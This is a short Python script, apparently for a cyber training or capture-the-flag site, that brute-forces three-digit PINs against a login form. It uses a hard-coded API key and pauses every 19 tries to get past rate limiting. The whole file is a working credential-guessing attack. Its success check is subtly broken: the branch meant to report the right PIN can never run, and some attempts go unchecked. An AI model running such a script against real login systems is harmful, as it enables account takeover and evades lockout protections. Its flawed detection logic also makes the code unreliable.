#!/usr/bin/python3

import requests
import re
import time

key = "6StVknGQcaqqZwjJw3q4m9ypm9cGbqf2!cYV9Vjs"
url = "http://104.cybertrial.co.uk/login"
r = requests.session()
counter = 0
min = 100
max = 1000
sleep_time = 30

#Set Session API Key
response = r.get("http://104.cybertrial.co.uk/?mykey=" + key)
#print("API Key Get Request Response Code: " + str(response.status_code))

for i in range(min, max, 1):
    payload = {"formgo": "1", "pin": str("{0:0=3d}".format(i))}
    print("Trying pin: " + payload["pin"])

    response = r.post(url, data=payload)

    check = re.search("Your pin is incorrect", response.text)

    with open("pin", 'w') as f:
        f.write(payload["pin"])
    
    if(counter < 19):
        if(check == None):
            print(response.text)
        elif(check[0]!="Your pin is incorrect"):
            print(response.text)
            print("Working pin: " + payload["pin"])
            break
        counter = counter + 1
    else:
        time.sleep(sleep_time)
        counter=0